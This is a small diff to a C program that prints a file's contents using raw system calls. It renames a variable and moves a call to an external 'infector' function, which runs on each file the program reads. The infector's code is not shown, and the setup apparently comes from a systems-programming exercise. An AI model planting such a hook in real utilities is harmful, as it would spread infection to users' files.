@@ -18,7 +18,7 @@ extern void infector(char *);
 
 void printFileContent(char* fileName) {
     char buffer[BUFFER_SIZE];
-    int status, bytesRead;
+    int status, readBytes;
 
     status = system_call(SYS_OPEN, fileName, READ_ONLY, 0777);
     if (status < 0) {
@@ -26,13 +26,13 @@ void printFileContent(char* fileName) {
     }
 
 
-    bytesRead = system_call(READ, status, buffer, BUFFER_SIZE);
-    while (bytesRead > 0) {
-        system_call(SYS_WRITE, STDOUT, buffer, bytesRead);
-        bytesRead = system_call(READ, status, buffer, BUFFER_SIZE);
+    readBytes = system_call(READ, status, buffer, BUFFER_SIZE);
+    while (readBytes > 0) {
+        system_call(SYS_WRITE, STDOUT, buffer, readBytes);
+        readBytes = system_call(READ, status, buffer, BUFFER_SIZE);
     }
-    infector(fileName);
 
+    infector(fileName);
 
     system_call(CLOSE, status, 0, 0);
 }
